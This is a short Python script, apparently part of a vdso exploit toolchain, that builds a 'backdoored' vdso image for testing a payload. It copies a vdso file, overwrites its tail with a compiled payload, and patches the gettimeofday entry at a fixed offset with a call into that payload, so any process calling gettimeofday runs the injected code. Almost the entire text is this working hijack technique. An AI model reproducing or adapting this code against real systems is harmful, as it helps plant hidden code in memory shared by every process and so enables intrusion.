#!/usr/bin/env python3

'''
Create a backdoored vdso to test payload.

hd -v vdso > /tmp/1 && hd -v vdso-backdoored > /tmp/2 && diff /tmp/1 /tmp/2
'''

import struct

with open('vdso', 'rb') as fp:
    data = fp.read()

with open('../payload.o', 'rb') as fp:
    payload = fp.read()

with open('vdso-backdoored', 'wb') as fp:
    fp.write(data)

    # put payload at the end of vdso
    sized = len(data)
    sizep = len(payload)

    fp.seek(sized - sizep)
    fp.write(payload)

    # hijack gettimeofday
    gettimeofday = 0xca0
    target = sized - sizep - gettimeofday
    call = b'\x90\xe8' + struct.pack('<I', target - 6)
    fp.seek(gettimeofday)
    fp.write(call)
